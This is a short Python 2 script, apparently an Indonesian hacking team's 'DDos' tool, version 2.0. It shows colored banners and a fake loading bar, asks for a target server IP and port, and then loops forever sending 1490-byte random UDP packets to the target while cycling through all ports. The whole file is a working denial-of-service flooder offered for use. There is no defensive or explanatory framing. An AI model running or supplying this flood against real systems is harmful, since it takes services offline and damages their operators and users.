import sys
import os
import time
import socket
import random

K = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############


"""
print('''\033[92m
                                                                       
DDDDDDDDDDDDD      DDDDDDDDDDDDD                                          
D::::::::::::DDD   D::::::::::::DDD                                       
D:::::::::::::::DD D:::::::::::::::DD                                     
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D                                    
  D:::::D    D:::::D D:::::D    D:::::D    ooooooooooo       ssssssssss   
  D:::::D     D:::::DD:::::D     D:::::D oo:::::::::::oo   ss::::::::::s  
  D:::::D     D:::::DD:::::D     D:::::Do:::::::::::::::oss:::::::::::::s 
  D:::::D     D:::::DD:::::D     D:::::Do:::::ooooo:::::os::::::ssss:::::s
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o s:::::s  ssssss 
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o   s::::::s      
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o      s::::::s   
  D:::::D    D:::::D D:::::D    D:::::D o::::o     o::::ossssss   s:::::s 
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  o:::::ooooo:::::os:::::ssss::::::s
D:::::::::::::::DD D:::::::::::::::DD   o:::::::::::::::os::::::::::::::s 
D::::::::::::DDD   D::::::::::::DDD      oo:::::::::::oo  s:::::::::::ss  
DDDDDDDDDDDDD      DDDDDDDDDDDDD           ooooooooooo     sssssssssss     Version:2.0  
                                                                          
\033[93m  


        \033[95m
		
+-----------------------------+
|    THIS TOOL IS PRIVATE     |
+-----------------------------+
| Coded By : Mr.Noname        |
+-----------------------------+

"""




print
print (U+"                                                            version:2.0")
print (K+"===========================================================")
print (R+"Author         : Mr.Noname")
print (H+"About Us       : http://panocteam.000webhostapp.com/")
print (H+"TEAM           : Pancasila anonim cyber")
print (H+"Thanks         : All Member Panoc")
print (H+"Instagram      : Panoc.Team")
print (K+"===========================================================")
print
ip = raw_input(R+"Server/IP Target : ")
port = input(H+"Port      : ")

os.system("clear")
os.system("figlet Memulai Paket")
print " . Load      0%"
time.sleep(1)
print " ..... Load      25%"
time.sleep(1)
print " .......... Load     50%"
time.sleep(1)
print " ............... Load   75%"
time.sleep(1)
print " .................... Load  100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (R+"Mengirim %s paket ke %s port %s"%(sent,ip,port))
     if port == 65534:
       port = 1